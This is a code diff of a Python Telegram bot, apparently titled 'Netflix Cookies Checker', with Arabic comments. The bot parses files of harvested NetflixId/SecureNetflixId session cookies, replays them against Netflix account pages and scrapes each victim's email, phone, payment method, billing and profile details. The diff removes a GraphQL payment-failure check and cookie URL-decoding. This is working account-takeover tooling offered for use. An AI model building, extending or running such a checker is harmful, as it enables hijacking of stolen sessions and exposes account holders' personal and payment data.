@@ -1,4 +1,4 @@
-# NF.py - Netflix Cookies Checker Bot (Final v5 - GraphQL with Correct IDs)
+# NF.py - Netflix Cookies Checker Bot (Stable Version - No GraphQL)
 import os
 import re
 import json
@@ -6,7 +6,6 @@ import zipfile
 import html
 import time
 import asyncio
-import urllib.parse
 from datetime import datetime
 from io import BytesIO
 
@@ -239,16 +238,6 @@ def decode_value(value):
     cleaned = re.sub(r"\s+", " ", cleaned).strip()
     return cleaned or None
 
-def decode_cookie_value(value):
-    if not value:
-        return value
-    try:
-        if '%' in value:
-            return urllib.parse.unquote(value)
-        return value
-    except:
-        return value
-
 def country_to_flag(code):
     if not code:
         return ""
@@ -364,130 +353,6 @@ def format_membership_status(status):
     else:
         return status.title()
 
-# ======================== كشف صفحة login ========================
-def is_login_page(html_content):
-    if not html_content:
-        return True
-    
-    html_lower = html_content.lower()
-    first_chunk = html_lower[:5000]
-    
-    has_account_signs = (
-        'your account' in first_chunk or
-        'account details' in first_chunk or
-        'membership details' in first_chunk or
-        'manage membership' in first_chunk or
-        'logout' in html_lower or
-        'sign out' in html_lower or
-        'manageprofiles' in html_lower or
-        'account-overview' in html_lower or
-        'data-uia="account' in html_lower
-    )
-    
-    if has_account_signs:
-        return False
-    
-    has_login_signs = (
-        'netflix - sign in' in html_lower[:500] or
-        'signin-form' in html_lower or
-        'login-form' in html_lower or
-        'id="signin"' in html_lower or
-        'name="password"' in first_chunk
-    )
-    
-    if has_login_signs and not has_account_signs:
-        return True
-    
-    return False
-
-# ======================== كشف payment failed من HTML ========================
-def check_payment_failed_html(html_content):
-    if not html_content:
-        return False
-    
-    html_lower = html_content.lower()
-    
-    signs = [
-        'update your payment information to continue',
-        'we were unable to process your last payment',
-        'unable to process your last payment',
-        'please update your payment information',
-        'clcspaymentfailurebannerview',
-        'payment_failure_interstitial',
-    ]
-    
-    for sign in signs:
-        if sign in html_lower:
-            return True
-    
-    return False
-
-# ======================== ✅ كشف payment failed من GraphQL (الطريقة النهائية) ========================
-# الـ IDs المعروفة - بنجرب كلها
-GRAPHQL_PERSISTED_QUERY_IDS = [
-    "03b4bbd1-8fa5-4528-bcee-7d539f207dde",  # من حساب 1
-    "a94e4f9f-e396-4a9d-8429-b2e5bdb08748",  # من حساب 2
-]
-
-async def check_payment_via_graphql(session):
-    """
-    بيفحص payment status عبر GraphQL
-    - بيدور على العلامة الأكيدة: clcsPaymentFailureBannerView
-    - بيجرب كل الـ IDs المعروفة
-    - لو فشل، بيكمل بدون ما يوقف الفحص
-    """
-    graphql_url = "https://www.netflix.com/graphql"
-    
-    headers = {
-        "accept": "*/*",
-        "accept-language": "en-US,en;q=0.9",
-        "content-type": "application/json",
-        "origin": "https://www.netflix.com",
-        "referer": "https://www.netflix.com/account",
-        "x-netflix.context.operation-name": "CLCSInterstitialAccountPages",
-        "x-netflix.request.originating.url": "https://www.netflix.com/account",
-        "x-netflix.request.attempt": "1",
-    }
-    
-    for pq_id in GRAPHQL_PERSISTED_QUERY_IDS:
-        try:
-            body = {
-                "operationName": "CLCSInterstitialAccountPages",
-                "variables": {
-                    "format": "HTML",
-                    "resolutionMode": "WEB_1X",
-                    "accountSubpage": "/account"
-                },
-                "extensions": {
-                    "persistedQuery": {
-                        "id": pq_id,
-                        "version": 102
-                    }
-                }
-            }
-            
-            async with session.post(graphql_url, json=body, headers=headers) as resp:
-                if resp.status == 200:
-                    response_text = await resp.text()
-                    
-                    # ✅ العلامة الأكيدة
-                    if "clcsPaymentFailureBannerView" in response_text:
-                        return True
-                    
-                    # ✅ لو رجع PersistedQueryNotFound، نجرب الـ ID التالي
-                    if '"errors"' in response_text and 'PersistedQuery' in response_text:
-                        continue
-                    
-                    # ✅ الطلب نجح بس مفيش payment failure
-                    return False
-                else:
-                    continue
-        except Exception as e:
-            print(f"[GraphQL Error with ID {pq_id[:8]}...] {e}")
-            continue
-    
-    return False
-
 # ======================== دوال استخراج الكوكيز ========================
 def extract_all_cookies_from_file(content):
     accounts = []
@@ -501,7 +366,6 @@ def extract_all_cookies_from_file(content):
     for match in all_matches:
         cookies = {}
         nf_value = match.group(1).strip('"')
-        nf_value = decode_cookie_value(nf_value)
 
         if any(acc['cookies'].get('NetflixId') == nf_value for acc in accounts):
             continue
@@ -515,9 +379,7 @@ def extract_all_cookies_from_file(content):
         snf_pattern = r'SecureNetflixId[=\t\s]+([^\s\n\t;]+)'
         snf_match = re.search(snf_pattern, nearby_text)
         if snf_match:
-            snf_value = snf_match.group(1).strip('"')
-            snf_value = decode_cookie_value(snf_value)
-            cookies['SecureNetflixId'] = snf_value
+            cookies['SecureNetflixId'] = snf_match.group(1).strip('"')
 
         accounts.append({"cookies": cookies, "raw": f"account_{len(accounts)+1}"})
 
@@ -534,7 +396,6 @@ def extract_all_cookies_from_file(content):
             if len(parts) >= 7:
                 name = parts[5]
                 value = parts[6]
-                value = decode_cookie_value(value)
 
                 if name == 'NetflixId':
                     netscape_cookies['NetflixId'] = value
@@ -555,11 +416,11 @@ def extract_all_cookies_from_file(content):
 
             nf_match = re.search(r'NetflixId[=\t]+([^\s\n\t;]+)', part)
             if nf_match:
-                cookies["NetflixId"] = decode_cookie_value(nf_match.group(1).strip('"'))
+                cookies["NetflixId"] = nf_match.group(1).strip('"')
 
             snf_match = re.search(r'SecureNetflixId[=\t]+([^\s\n\t;]+)', part)
             if snf_match:
-                cookies["SecureNetflixId"] = decode_cookie_value(snf_match.group(1).strip('"'))
+                cookies["SecureNetflixId"] = snf_match.group(1).strip('"')
 
             if cookies.get("NetflixId"):
                 if not any(acc['cookies'].get('NetflixId') == cookies['NetflixId'] for acc in accounts):
@@ -760,127 +621,110 @@ def is_valid_profile_name(name):
 
     return True
 
-async def extract_profiles_from_page(session, url):
-    page_profiles = []
-    html_content = ""
-
-    try:
-        async with session.get(url, allow_redirects=True) as resp:
-            if resp.status != 200:
-                return page_profiles, ""
-            html_content = await resp.text()
-
-        if is_login_page(html_content):
-            return page_profiles, html_content
-
-        profiles_match = re.search(r'"profiles"\s*:\s*\[(.*?)\](?=\s*[,\}])', html_content, re.DOTALL)
-        if profiles_match:
-            profiles_data = profiles_match.group(1)
-            if any(key in profiles_data for key in ['profileId', 'profileGuid', 'avatar', 'avatarUrl']):
-                all_names = re.findall(r'"name"\s*:\s*"([^"]+)"', profiles_data)
-                for name in all_names:
-                    decoded = clean_profile_name(name)
-                    if is_valid_profile_name(decoded) and decoded not in page_profiles:
-                        page_profiles.append(decoded)
-
-        profile_matches = re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html_content)
-        for match in profile_matches:
-            pname = clean_profile_name(match.group(1))
-            if is_valid_profile_name(pname) and pname not in page_profiles:
-                page_profiles.append(pname)
-
-        if not page_profiles:
-            alt_matches = re.finditer(r'"profiles"\s*:\s*\[.*?"name"\s*:\s*"([^"]+)"', html_content, re.DOTALL)
-            for match in alt_matches:
-                pname = clean_profile_name(match.group(1))
-                if is_valid_profile_name(pname) and pname not in page_profiles:
-                    page_profiles.append(pname)
-
-        profile_classes = [
-            r'<span[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</span>',
-            r'<div[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</div>',
-            r'<a[^>]*class="[^"]*profile-link[^"]*"[^>]*>([^<]+)</a>',
-            r'<div[^>]*data-profile-name[^>]*>([^<]+)</div>',
-            r'<span[^>]*data-uia="profile-name"[^>]*>([^<]+)</span>',
-            r'<div[^>]*aria-label="Profile[^"]*"[^>]*>([^<]+)</div>',
-            r'<h1[^>]*class="[^"]*profile[^"]*"[^>]*>([^<]+)</h1>',
-            r'<h2[^>]*class="[^"]*profile[^"]*"[^>]*>([^<]+)</h2>',
-            r'<span[^>]*data-uia="profile-avatar-name"[^>]*>([^<]+)</span>',
-            r'<div[^>]*class="[^"]*profile-avatar[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>',
-            r'<p[^>]*class="[^"]*profile[^"]*name[^"]*"[^>]*>([^<]+)</p>',
-            r'<span[^>]*class="[^"]*profileName[^"]*"[^>]*>([^<]+)</span>',
-        ]
-
-        for pattern in profile_classes:
-            matches = re.finditer(pattern, html_content, re.IGNORECASE | re.DOTALL)
-            for match in matches:
-                pname = clean_profile_name(match.group(1))
-                if is_valid_profile_name(pname) and pname not in page_profiles:
-                    page_profiles.append(pname)
-
-        if not page_profiles:
-            alt_pattern = r'"profileId"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
-            matches = re.finditer(alt_pattern, html_content)
-            for match in matches:
-                pname = clean_profile_name(match.group(1))
-                if is_valid_profile_name(pname) and pname not in page_profiles:
-                    page_profiles.append(pname)
-
-        if not page_profiles:
-            alt_pattern2 = r'"profileGuid"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
-            matches = re.finditer(alt_pattern2, html_content)
-            for match in matches:
-                pname = clean_profile_name(match.group(1))
-                if is_valid_profile_name(pname) and pname not in page_profiles:
-                    page_profiles.append(pname)
-
-        if not page_profiles:
-            alt_pattern3 = r'profile[^}]*?"name"\s*:\s*"([^"]+)"'
-            matches = re.finditer(alt_pattern3, html_content, re.IGNORECASE | re.DOTALL)
-            for match in matches:
-                pname = clean_profile_name(match.group(1))
-                if is_valid_profile_name(pname) and pname not in page_profiles:
-                    page_profiles.append(pname)
-
-        if not page_profiles:
-            next_data_match = re.search(r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.{0,500000}?)</script>', html_content, re.DOTALL)
-            if next_data_match:
-                try:
-                    next_data = json.loads(next_data_match.group(1))
-                    names = _find_profile_names_in_json(next_data)
-                    for n in names:
-                        pname = clean_profile_name(n)
-                        if is_valid_profile_name(pname) and pname not in page_profiles:
-                            page_profiles.append(pname)
-                except:
-                    pass
-
-        if not page_profiles:
-            react_match = re.search(r'netflix\.react\.context\s*=\s*(\{.{0,500000}?\});', html_content, re.DOTALL)
-            if react_match:
-                try:
-                    ctx = json.loads(react_match.group(1))
-                    names = _find_profile_names_in_json(ctx)
-                    for n in names:
-                        pname = clean_profile_name(n)
-                        if is_valid_profile_name(pname) and pname not in page_profiles:
-                            page_profiles.append(pname)
-                except:
-                    pass
-
-    except Exception as e:
-        pass
-
-    return page_profiles, html_content
-
 async def extract_profiles_from_manage(session):
-    """بتاخد البروفايلات من ManageProfiles أو account/profiles"""
     profiles = []
 
     for url in ["https://www.netflix.com/ManageProfiles", "https://www.netflix.com/account/profiles"]:
-        profiles, html = await extract_profiles_from_page(session, url)
-        if profiles:
-            break
+        try:
+            async with session.get(url, allow_redirects=True) as resp:
+                if resp.status != 200:
+                    continue
+                html_content = await resp.text()
+
+            if "signin" in html_content.lower()[:2000] and "logout" not in html_content.lower():
+                continue
+
+            profiles_match = re.search(r'"profiles"\s*:\s*\[(.*?)\](?=\s*[,\}])', html_content, re.DOTALL)
+            if profiles_match:
+                profiles_data = profiles_match.group(1)
+                if any(key in profiles_data for key in ['profileId', 'profileGuid', 'avatar', 'avatarUrl']):
+                    all_names = re.findall(r'"name"\s*:\s*"([^"]+)"', profiles_data)
+                    for name in all_names:
+                        decoded = clean_profile_name(name)
+                        if is_valid_profile_name(decoded) and decoded not in profiles:
+                            profiles.append(decoded)
+
+            profile_matches = re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html_content)
+            for match in profile_matches:
+                pname = clean_profile_name(match.group(1))
+                if is_valid_profile_name(pname) and pname not in profiles:
+                    profiles.append(pname)
+
+            if not profiles:
+                alt_matches = re.finditer(r'"profiles"\s*:\s*\[.*?"name"\s*:\s*"([^"]+)"', html_content, re.DOTALL)
+                for match in alt_matches:
+                    pname = clean_profile_name(match.group(1))
+                    if is_valid_profile_name(pname) and pname not in profiles:
+                        profiles.append(pname)
+
+            profile_classes = [
+                r'<span[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</span>',
+                r'<div[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</div>',
+                r'<a[^>]*class="[^"]*profile-link[^"]*"[^>]*>([^<]+)</a>',
+                r'<div[^>]*data-profile-name[^>]*>([^<]+)</div>',
+                r'<span[^>]*data-uia="profile-name"[^>]*>([^<]+)</span>',
+                r'<div[^>]*aria-label="Profile[^"]*"[^>]*>([^<]+)</div>',
+                r'<h1[^>]*class="[^"]*profile[^"]*"[^>]*>([^<]+)</h1>',
+                r'<h2[^>]*class="[^"]*profile[^"]*"[^>]*>([^<]+)</h2>',
+                r'<span[^>]*data-uia="profile-avatar-name"[^>]*>([^<]+)</span>',
+                r'<p[^>]*class="[^"]*profile[^"]*name[^"]*"[^>]*>([^<]+)</p>',
+                r'<span[^>]*class="[^"]*profileName[^"]*"[^>]*>([^<]+)</span>',
+            ]
+
+            for pattern in profile_classes:
+                matches = re.finditer(pattern, html_content, re.IGNORECASE)
+                for match in matches:
+                    pname = clean_profile_name(match.group(1))
+                    if is_valid_profile_name(pname) and pname not in profiles:
+                        profiles.append(pname)
+
+            if not profiles:
+                alt_pattern = r'"profileId"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
+                matches = re.finditer(alt_pattern, html_content)
+                for match in matches:
+                    pname = clean_profile_name(match.group(1))
+                    if is_valid_profile_name(pname) and pname not in profiles:
+                        profiles.append(pname)
+
+            if not profiles:
+                alt_pattern2 = r'"profileGuid"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
+                matches = re.finditer(alt_pattern2, html_content)
+                for match in matches:
+                    pname = clean_profile_name(match.group(1))
+                    if is_valid_profile_name(pname) and pname not in profiles:
+                        profiles.append(pname)
+
+            if not profiles:
+                next_data_match = re.search(r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.{0,500000}?)</script>', html_content, re.DOTALL)
+                if next_data_match:
+                    try:
+                        next_data = json.loads(next_data_match.group(1))
+                        names = _find_profile_names_in_json(next_data)
+                        for n in names:
+                            pname = clean_profile_name(n)
+                            if is_valid_profile_name(pname) and pname not in profiles:
+                                profiles.append(pname)
+                    except:
+                        pass
+
+            if not profiles:
+                react_match = re.search(r'netflix\.react\.context\s*=\s*(\{.{0,500000}?\});', html_content, re.DOTALL)
+                if react_match:
+                    try:
+                        ctx = json.loads(react_match.group(1))
+                        names = _find_profile_names_in_json(ctx)
+                        for n in names:
+                            pname = clean_profile_name(n)
+                            if is_valid_profile_name(pname) and pname not in profiles:
+                                profiles.append(pname)
+                    except:
+                        pass
+
+            if profiles:
+                break
+
+        except Exception as e:
+            continue
 
     profiles = list(dict.fromkeys(profiles))
     profiles = [p for p in profiles if is_valid_profile_name(p)]
@@ -915,158 +759,127 @@ async def get_account_info(cookies):
             cookies=session_cookies,
             headers=headers
         ) as session:
-            # ============ 1. صفحة /account ============
-            async with session.get("https://www.netflix.com/account", allow_redirects=True) as resp:
-                if resp.status != 200:
-                    # fallback على YourAccount
-                    async with session.get("https://www.netflix.com/YourAccount", allow_redirects=True) as resp2:
-                        if resp2.status != 200:
-                            return None, f"HTTP {resp2.status}"
-                        html_content = await resp2.text()
-                else:
+            async with session.get("https://www.netflix.com/YourAccount", allow_redirects=True) as resp:
+                if resp.status == 200:
                     html_content = await resp.text()
 
-                if is_login_page(html_content):
-                    return None, "Not logged in - cookie expired"
+                    if "logout" not in html_content.lower() and "signin" in html_content.lower():
+                        return None, "Not logged in - cookie expired"
 
-                info = {}
+                    info = {}
 
-                # payment_failed من HTML
-                payment_failed = check_payment_failed_html(html_content)
-
-                # استخراج البيانات
-                name_match = re.search(r'"firstName"\s*:\s*"([^"]+)"', html_content)
-                if name_match:
-                    info["name"] = decode_value(name_match.group(1))
-                else:
-                    name_match = re.search(r'"name"\s*:\s*"([^"]+)"', html_content)
+                    name_match = re.search(r'"firstName"\s*:\s*"([^"]+)"', html_content)
                     if name_match:
                         info["name"] = decode_value(name_match.group(1))
+                    else:
+                        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', html_content)
+                        if name_match:
+                            info["name"] = decode_value(name_match.group(1))
 
-                email = None
-                email_match = re.search(r'"email"\s*:\s*"([^"]+)"', html_content)
-                if email_match:
-                    email = decode_value(email_match.group(1))
-                if not email:
-                    email_match = re.search(r'"loginId"\s*:\s*"([^"]+)"', html_content)
+                    email = None
+                    email_match = re.search(r'"email"\s*:\s*"([^"]+)"', html_content)
                     if email_match:
                         email = decode_value(email_match.group(1))
-                if not email:
-                    email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html_content)
-                    if email_match:
-                        email = decode_value(email_match.group(1))
-                if not email:
-                    email_match = re.search(r'<span[^>]*class="[^"]*email[^"]*"[^>]*>([^<]+)</span>', html_content, re.IGNORECASE)
-                    if email_match:
-                        email = decode_value(email_match.group(1))
-                info["email"] = email
+                    if not email:
+                        email_match = re.search(r'"loginId"\s*:\s*"([^"]+)"', html_content)
+                        if email_match:
+                            email = decode_value(email_match.group(1))
+                    if not email:
+                        email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html_content)
+                        if email_match:
+                            email = decode_value(email_match.group(1))
+                    if not email:
+                        email_match = re.search(r'<span[^>]*class="[^"]*email[^"]*"[^>]*>([^<]+)</span>', html_content, re.IGNORECASE)
+                        if email_match:
+                            email = decode_value(email_match.group(1))
+                    info["email"] = email
 
-                country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', html_content)
-                if not country_match:
-                    country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', html_content)
-                if country_match:
-                    info["country"] = decode_value(country_match.group(1))
+                    country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', html_content)
+                    if not country_match:
+                        country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', html_content)
+                    if country_match:
+                        info["country"] = decode_value(country_match.group(1))
 
-                lang_match = re.search(r'"language"\s*:\s*"([^"]+)"', html_content)
-                if lang_match:
-                    info["language"] = decode_value(lang_match.group(1))
+                    lang_match = re.search(r'"language"\s*:\s*"([^"]+)"', html_content)
+                    if lang_match:
+                        info["language"] = decode_value(lang_match.group(1))
 
-                member_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html_content)
-                if member_match:
-                    info["memberSince"] = decode_value(member_match.group(1))
+                    member_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html_content)
+                    if member_match:
+                        info["memberSince"] = decode_value(member_match.group(1))
 
-                billing_match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', html_content)
-                if billing_match:
-                    info["nextBilling"] = decode_value(billing_match.group(1))
-                else:
-                    billing_match = re.search(r'"nextBillingDate":\s*{[^}]*"date"\s*:\s*"([^"]+)"', html_content)
+                    billing_match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', html_content)
                     if billing_match:
                         info["nextBilling"] = decode_value(billing_match.group(1))
+                    else:
+                        billing_match = re.search(r'"nextBillingDate":\s*{[^}]*"date"\s*:\s*"([^"]+)"', html_content)
+                        if billing_match:
+                            info["nextBilling"] = decode_value(billing_match.group(1))
 
-                payment_method = extract_payment_method(html_content)
-                if payment_method:
-                    info["payment"] = payment_method
-                else:
-                    payment_match = re.search(r'"paymentMethod"\s*:\s*"([^"]+)"', html_content)
-                    if payment_match:
-                        info["payment"] = decode_value(payment_match.group(1))
+                    payment_method = extract_payment_method(html_content)
+                    if payment_method:
+                        info["payment"] = payment_method
+                    else:
+                        payment_match = re.search(r'"paymentMethod"\s*:\s*"([^"]+)"', html_content)
+                        if payment_match:
+                            info["payment"] = decode_value(payment_match.group(1))
 
-                phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html_content)
-                if phone_match:
-                    info["phone"] = decode_value(phone_match.group(1))
+                    phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html_content)
+                    if phone_match:
+                        info["phone"] = decode_value(phone_match.group(1))
 
-                phone_verified_match = re.search(r'"phoneVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
-                if phone_verified_match:
-                    info["phone_verified"] = "Verified" if phone_verified_match.group(1).lower() == "true" else "Not Verified"
+                    phone_verified_match = re.search(r'"phoneVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
+                    if phone_verified_match:
+                        info["phone_verified"] = "Verified" if phone_verified_match.group(1).lower() == "true" else "Not Verified"
 
-                streams_match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', html_content)
-                if streams_match:
-                    info["streams"] = streams_match.group(1)
+                    streams_match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', html_content)
+                    if streams_match:
+                        info["streams"] = streams_match.group(1)
 
-                hold_match = re.search(r'"holdStatus"\s*:\s*(true|false)', html_content, re.IGNORECASE)
-                info["hold"] = "Yes" if hold_match and hold_match.group(1).lower() == "true" else "No"
+                    hold_match = re.search(r'"holdStatus"\s*:\s*(true|false)', html_content, re.IGNORECASE)
+                    info["hold"] = "Yes" if hold_match and hold_match.group(1).lower() == "true" else "No"
 
-                extra_match = re.search(r'"showExtraMemberSection"\s*:\s*(true|false)', html_content, re.IGNORECASE)
-                info["extra_member"] = "Yes" if extra_match and extra_match.group(1).lower() == "true" else "No"
+                    extra_match = re.search(r'"showExtraMemberSection"\s*:\s*(true|false)', html_content, re.IGNORECASE)
+                    info["extra_member"] = "Yes" if extra_match and extra_match.group(1).lower() == "true" else "No"
 
-                email_verified_match = re.search(r'"emailVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
-                info["email_verified"] = "Yes" if email_verified_match and email_verified_match.group(1).lower() == "true" else "No"
+                    email_verified_match = re.search(r'"emailVerified"\s*:\s*(true|false)', html_content, re.IGNORECASE)
+                    info["email_verified"] = "Yes" if email_verified_match and email_verified_match.group(1).lower() == "true" else "No"
 
-                status_match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html_content)
-                if status_match:
-                    raw_status = decode_value(status_match.group(1))
-                    info["status"] = format_membership_status(raw_status)
-                else:
-                    info["status"] = "Active"
+                    status_match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html_content)
+                    if status_match:
+                        raw_status = decode_value(status_match.group(1))
+                        info["status"] = format_membership_status(raw_status)
+                    else:
+                        info["status"] = "Active"
 
-                plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', html_content)
-                if not plan_match:
-                    plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', html_content)
-                if plan_match:
-                    info["plan"] = decode_value(plan_match.group(1))
+                    # لو holdStatus = true → Hold
+                    if info.get("hold") == "Yes":
+                        info["status"] = "Hold"
 
-                quality_match = re.search(r'"videoQuality"\s*:\s*"([^"]+)"', html_content)
-                if quality_match:
-                    info["quality"] = decode_value(quality_match.group(1))
+                    plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', html_content)
+                    if not plan_match:
+                        plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', html_content)
+                    if plan_match:
+                        info["plan"] = decode_value(plan_match.group(1))
 
-            # ============ 2. GraphQL check (الطريقة الأقوى) ============
-            try:
-                graphql_payment_failed = await check_payment_via_graphql(session)
-                if graphql_payment_failed:
-                    payment_failed = True
-            except Exception as e:
-                print(f"[GraphQL skip] {e}")
+                    quality_match = re.search(r'"videoQuality"\s*:\s*"([^"]+)"', html_content)
+                    if quality_match:
+                        info["quality"] = decode_value(quality_match.group(1))
 
-            # ============ 3. صفحة البروفايلات ============
-            profiles = await extract_profiles_from_manage(session)
+                    profiles = await extract_profiles_from_manage(session)
 
-            # ============ 4. صفحة العضوية (fallback) ============
-            if not payment_failed:
-                try:
-                    async with session.get("https://www.netflix.com/account/membership", allow_redirects=True) as mem_resp:
-                        if mem_resp.status == 200:
-                            mem_html = await mem_resp.text()
-                            if check_payment_failed_html(mem_html):
-                                payment_failed = True
-                except:
-                    pass
+                    if profiles:
+                        info["profiles"] = profiles
+                        info["profiles_count"] = len(profiles)
+                        info["profiles_list"] = ", ".join(profiles)
+                    else:
+                        info["profiles"] = []
+                        info["profiles_count"] = 0
+                        info["profiles_list"] = "No profiles found"
 
-            # ============ تحديد الحالة النهائية ============
-            if payment_failed:
-                info["status"] = "Hold"
-            elif info.get("hold") == "Yes":
-                info["status"] = "Hold"
+                    return info, None
 
-            if profiles:
-                info["profiles"] = profiles
-                info["profiles_count"] = len(profiles)
-                info["profiles_list"] = ", ".join(profiles)
-            else:
-                info["profiles"] = []
-                info["profiles_count"] = 0
-                info["profiles_list"] = "No profiles found"
-
-            return info, None
+                return None, f"HTTP {resp.status}"
 
     except asyncio.TimeoutError:
         return None, "Request timed out"
@@ -1091,14 +904,6 @@ def determine_plan(info):
     elif "premium" in plan_name or "standard" in plan_name or "basic" in plan_name or "mobile" in plan_name:
         is_subscribed = True
     elif streams and streams.isdigit() and int(streams) > 0:
-        is_subscribed = True
-    elif info.get("email") and info.get("name"):
-        is_subscribed = True
-    elif info.get("phone"):
-        is_subscribed = True
-    elif info.get("payment"):
-        is_subscribed = True
-    elif info.get("memberSince"):
         is_subscribed = True
 
     if not is_subscribed:
@@ -1839,10 +1644,10 @@ def main():
 
     print("=" * 50)
     print("✅ Netflix Checker Bot is running...")
-    print("✅ GraphQL Payment Detection (with 2 IDs)")
-    print("✅ URL-decoding for cookies")
+    print("✅ Stable version - No GraphQL")
     print("✅ Async mode - /cancel INSTANT")
     print("✅ Profile extraction (15 methods)")
+    print("✅ Language & UI filter active")
     print("=" * 50)
 
     app.run_polling(allowed_updates=Update.ALL_TYPES)
